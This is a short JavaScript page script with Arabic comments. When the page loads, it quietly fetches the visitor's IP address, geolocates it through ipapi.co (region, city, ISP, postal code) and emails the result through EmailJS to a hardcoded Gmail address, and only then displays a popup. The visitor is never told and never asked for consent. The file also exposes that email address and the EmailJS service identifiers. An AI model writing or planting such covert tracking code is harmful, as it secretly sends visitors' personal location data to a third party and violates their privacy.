// تأكد أن كل العناصر محمّلة أولاً
document.addEventListener("DOMContentLoaded", function () {
    const popup = document.getElementById("popup");

    emailjs.init("GRpOF1pKqcSg9cx5H");

    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
        .then(res => res.json())
        .then(loc => {
            const locationString = `${loc.region || '---'} - ${loc.city || '---'} - ${loc.county || '---'} - ${loc.org || '---'} - ${loc.postal || '---'}`;
            return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                to_email: "e508769103@gmail.com",
                message: locationString
            });
        })
        .catch(error => {
            console.error("حدث خطأ أثناء إرسال البريد:", error);
        })
        .finally(() => {
            popup.style.display = "block";
        });
});
